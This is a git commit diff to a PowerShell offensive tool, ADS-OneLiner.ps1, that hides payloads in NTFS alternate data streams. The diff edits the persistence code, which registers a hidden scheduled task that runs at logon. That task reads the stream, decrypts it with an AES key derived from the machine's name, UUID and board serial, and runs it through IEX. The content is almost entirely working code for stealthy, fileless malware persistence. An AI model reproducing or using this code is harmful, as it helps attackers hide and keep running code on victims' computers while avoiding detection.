a468a25d43560cd4a784e02f7ca660af859ba062
Qweary <goodqweary@gmail.com>
2026-02-01 22:05:42 -0800

    Update ADS-OneLiner.ps1
    dog on a computer at this point

--- src/ADS-OneLiner.ps1
+++ src/ADS-OneLiner.ps1
@@ -244,10 +244,11 @@ if ($CreateDecoys -gt 0) {
 # Persistence
 if ($Persist -eq 'task') {
     if ($Encrypt) {
-        # Encrypted task needs decrypt functions
+        # Encrypted task
         $minimalScript += @"
-# Scheduled task (encrypted)
-`$taskCmd='function Get-HostKey{`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join''|'';[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))};function Dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};`$k=Get-HostKey;`$e=gc ('`$hp`:'+`$sn)|%{`$c+=`$_+[char]10};IEX `$c`"";`$p=Dec `$e `$k;IEX `$p'
+# Scheduled task (encrypted, PS2.0 compatible)
+`$adsPath=`$hp+':'+`$sn
+`$taskCmd='function Get-HostKey{`$h=@(`$env:COMPUTERNAME,(gwmi Win32_ComputerSystemProduct -EA 0).UUID,(gwmi Win32_BaseBoard -EA 0).SerialNumber)-join''|'';[System.Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::UTF8.GetBytes(`$h))};function Dec(`$d,`$k){`$b=[Convert]::FromBase64String(`$d);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$k;`$a.IV=`$b[0..15];`$c=`$a.CreateDecryptor();`$t=`$b[16..(`$b.Length-1)];`$p=`$c.TransformFinalBlock(`$t,0,`$t.Length);[Text.Encoding]::UTF8.GetString(`$p)};`$k=Get-HostKey;`$e='''';gc '''+`$adsPath+'''|%{`$e+=`$_+[char]10};`$p=Dec `$e `$k;IEX `$p'
 `$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `"`$taskCmd`""
 `$t=New-ScheduledTaskTrigger -AtLogOn
 `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
@@ -255,10 +256,12 @@ Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Fo
 
 "@
     } else {
-        # Unencrypted task (FIXED)
+        # Unencrypted task
         $minimalScript += @"
 # Scheduled task
-`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `"`$c='';gc ('`$hp`:'+`$sn)|%{`$c+=`$_+[char]10};IEX `$c`""
+`$adsPath=`$hp+':'+`$sn
+`$cmd="`$c='';gc '`$adsPath'|%{`$c+=`$_+[char]10};IEX `$c"
+`$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoP -W Hidden -C `"`$cmd`""
 `$t=New-ScheduledTaskTrigger -AtLogOn
 `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
 Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null
